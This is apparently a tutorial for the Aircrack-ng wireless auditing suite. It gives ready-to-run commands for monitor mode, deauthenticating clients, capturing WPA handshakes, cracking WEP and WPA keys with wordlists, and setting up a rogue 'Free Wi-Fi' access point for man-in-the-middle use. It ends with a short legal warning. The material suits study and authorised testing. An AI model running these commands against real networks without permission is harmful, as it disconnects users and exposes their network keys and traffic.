 
---

# 🛰️ What is Aircrack-ng?

**Aircrack-ng** is a **complete suite of tools for auditing wireless networks**. It is widely used for **cracking WEP and WPA/WPA2-PSK keys**, **monitoring Wi-Fi traffic**, **packet injection**, and **capturing handshakes**.

🛠️ It is a **must-know tool** for ethical hackers and penetration testers conducting **Wi-Fi security assessments**.

---

## 🧩 Aircrack-ng Tool Suite Components

| Tool             | Description                                            |
| ---------------- | ------------------------------------------------------ |
| `airmon-ng`      | Puts wireless card into **monitor mode**               |
| `airodump-ng`    | Captures raw packets and Wi-Fi handshakes              |
| `aireplay-ng`    | Performs **packet injection**, deauth, fake auth, etc. |
| `aircrack-ng`    | Cracks WEP/WPA-PSK keys from capture files             |
| `airbase-ng`     | Creates rogue AP (evil twin)                           |
| `airdecloak-ng`  | Removes cloaking from WEP capture files                |
| `packetforge-ng` | Crafts custom packets (for WEP)                        |
| `ivstools`       | Manipulates IVs for WEP cracking                       |

---

## 🛠️ Installation

### ✅ On Kali Linux

Already installed. If not:

```bash
sudo apt update
sudo apt install aircrack-ng -y
```

### ✅ On Ubuntu/Debian

```bash
sudo apt install aircrack-ng
```

### ✅ On Arch

```bash
sudo pacman -S aircrack-ng
```

### ✅ From Source

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 🧾 Typical Workflow for WPA/WPA2 Cracking

### 1. Enable Monitor Mode

```bash
airmon-ng start wlan0
```

➡️ This creates `wlan0mon` for packet capture.

---

### 2. Scan Networks

```bash
airodump-ng wlan0mon
```

➡️ Shows BSSID, ESSID, channel, encryption, etc.

---

### 3. Target Specific Network

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

* `-c`: channel
* `--bssid`: target AP
* `-w`: file to save packets

---

### 4. Force Deauthentication

```bash
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c XX:YY:ZZ:... wlan0mon
```

* Forces client to disconnect
* WPA handshake is captured when they reconnect

---

### 5. Crack WPA Key

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

✅ If password is in the wordlist, Aircrack-ng will find it.

---

## 📌 WEP Cracking Example

1. Start Monitor Mode

```bash
airmon-ng start wlan0
```

2. Capture IVs

```bash
airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon
```

3. Inject Packets

```bash
aireplay-ng -3 -b <BSSID> wlan0mon
```

4. Crack WEP Key

```bash
aircrack-ng wep_capture-01.cap
```

✅ WEP can often be cracked in seconds if enough IVs are collected.

---

## 📂 Output Files

* `.cap`: Packet capture (used by aircrack-ng)
* `.csv`: CSV-formatted summary
* `.netxml`: For compatibility with other tools

---

## 🧠 Other Useful Commands

### ✔️ To stop monitor mode:

```bash
airmon-ng stop wlan0mon
```

### ✔️ Check interface status:

```bash
iwconfig
```

### ✔️ Check connected clients (STATIONs):

```bash
airodump-ng wlan0mon
```

---

## ⚙️ aircrack-ng Options

```bash
aircrack-ng [options] capture_file.cap
```

| Option | Description                         |
| ------ | ----------------------------------- |
| `-a`   | Force attack mode: 1 = WEP, 2 = WPA |
| `-b`   | Target BSSID                        |
| `-w`   | Wordlist file                       |
| `-e`   | Target ESSID                        |
| `-l`   | Output cracked key to a file        |
| `-q`   | Quiet mode                          |

---

## 🔐 WPA/WPA2 Handshake Capture Tips

* Needs **at least one client** to capture handshake
* Use `--deauth` to force a reauthentication
* Use `Wireshark` to verify if the 4-way handshake exists

---

## 💣 aireplay-ng Attack Modes

| Attack | Description                |
| ------ | -------------------------- |
| `-0`   | Deauthentication           |
| `-1`   | Fake authentication        |
| `-2`   | Interactive packet replay  |
| `-3`   | ARP replay (WEP injection) |
| `-9`   | Injection test             |

---

## 🧪 Example Scenario – WPA2 Crack

### 1. Start monitor:

```bash
airmon-ng start wlan0
```

### 2. Find target:

```bash
airodump-ng wlan0mon
```

### 3. Focus:

```bash
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w test wlan0mon
```

### 4. Force disconnect:

```bash
aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 wlan0mon
```

### 5. Crack key:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap
```

---

## 🧪 Example – WEP Crack in 5 Steps

```bash
airmon-ng start wlan0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
aircrack-ng wep-01.cap
```

---

## 🧰 Advanced: Airbase-ng for Rogue AP

```bash
airbase-ng -e "Free Wi-Fi" -c 11 wlan0mon
```

* Creates a fake AP named “Free Wi-Fi”
* Can be combined with **MITM** and **captive portals**

---

## 🔐 Legal and Ethical Use

**⚠️ Warning:** Use only on **your own networks** or those you have **explicit permission** to test. Unauthorized use is illegal.

---

## 🧩 Tools You Can Combine With Aircrack-ng

* **Wireshark** – analyze capture files
* **Bettercap / MITMf** – for MITM attacks
* **Wifite / Fluxion** – GUI wrappers around aircrack-ng
* **Cowpatty** – faster WPA cracking with pre-computed hashes
* **Crunch** – generate wordlists

---

## 📚 Resources

* 🔗 [Official Site](https://www.aircrack-ng.org/)
* 🔗 [GitHub](https://github.com/aircrack-ng/aircrack-ng)
* 📘 `man aircrack-ng`

---


 